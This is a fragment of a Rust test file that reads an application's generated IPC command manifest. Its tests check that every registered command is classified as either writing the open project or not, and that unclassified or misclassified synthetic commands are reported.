/// The registered commands, from the generated manifest.
fn manifest_commands() -> Vec<ManifestCommand> {
    let outcomes = mutation_outcome_types();
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands")
        .iter()
        .map(|c| {
            let name = c["name"].as_str().expect("every command has a name");
            ManifestCommand {
                name: name.to_owned(),
                module: c["module"]
                    .as_str()
                    .expect("every command has a module")
                    .to_owned(),
                by_type: name == SAVE_COMMAND
                    || c["result"]["rust"]
                        .as_str()
                        .is_some_and(|ty| outcomes.iter().any(|o| o == ty)),
                carries_identity: c["args"].as_array().is_some_and(|args| {
                    args.iter()
                        .any(|arg| arg["name"].as_str() == Some("expected_project"))
                }),
            }
        })
        .collect()
}

/// [#576 RVF-c-C1] Every registered command is classified: it carries the identity
/// of the project it was made for (a `MutationOutcome` answer, `save_project`, or
/// [`OTHER_OPEN_PROJECT_WRITERS`] - pinned by
/// [`every_save_and_mutation_command_names_the_project_it_was_made_for`]), or it is
/// listed, with the reason, as not writing the open project
/// ([`NOT_OPEN_PROJECT_WRITERS`], or its whole module in
/// [`NOT_OPEN_PROJECT_WRITER_MODULES`]). The scan used to pick the carriers by their
/// return type alone, so a writer answering anything else - the dive-plan save, the
/// SpeleoDB Unlink, Done, Push - was never asked for the identity; now a new command
/// fails here until someone decides which it is. The manifest is cross-checked
/// against the source scan, so neither side can pass by seeing nothing.
#[test]
fn every_registered_command_is_classified_as_writing_the_open_project_or_not() {
    let commands = manifest_commands();
    assert!(
        commands.len() > 150,
        "premise: the manifest lists every registered command, got {}",
        commands.len()
    );
    let mut registered: Vec<&str> = commands.iter().map(|c| c.name.as_str()).collect();
    registered.sort_unstable();
    let scanned = scanned_commands();
    let mut seen: Vec<&str> = scanned.iter().map(|c| c.name.as_str()).collect();
    seen.sort_unstable();
    assert_eq!(
        seen, registered,
        "premise: the source scan finds exactly the commands the manifest registers"
    );
    let failures = classification_failures(&commands);
    assert!(
        failures.is_empty(),
        "RULE (every command is classified as writing the open project or not, #576 \
         RVF-c-C1): {} problem(s):\n{}",
        failures.len(),
        failures.join("\n")
    );
}

/// The classification's own failure modes, on synthetic commands: an unclassified
/// one is reported with how to classify it, a writer in a module listed as having
/// none is reported, and an identity carrier listed as not writing is reported.
#[test]
fn the_classification_reports_an_unclassified_command() {
    let mut commands = manifest_commands();
    commands.push(ManifestCommand {
        name: "brand_new_verb".to_owned(),
        module: "project".to_owned(),
        by_type: false,
        carries_identity: false,
    });
    commands.push(ManifestCommand {
        name: "new_export_writer".to_owned(),
        module: "export".to_owned(),
        by_type: true,
        carries_identity: true,
    });
    if let Some(c) = commands.iter_mut().find(|c| c.name == "get_config") {
        c.carries_identity = true;
    }
    let failures = classification_failures(&commands);
    let names = |needle: &str| failures.iter().filter(|f| f.contains(needle)).count();
    assert_eq!(
        names("`brand_new_verb` (module `project`) is not classified"),
        1
    );
    assert_eq!(names("OTHER_OPEN_PROJECT_WRITERS; otherwise add it"), 1);
    assert_eq!(
        names("`new_export_writer` (module `export`) is an open-project writer"),
        1
    );
    assert_eq!(names("`get_config` carries `expected_project`"), 1);
    assert_eq!(failures.len(), 3, "{failures:?}");
}
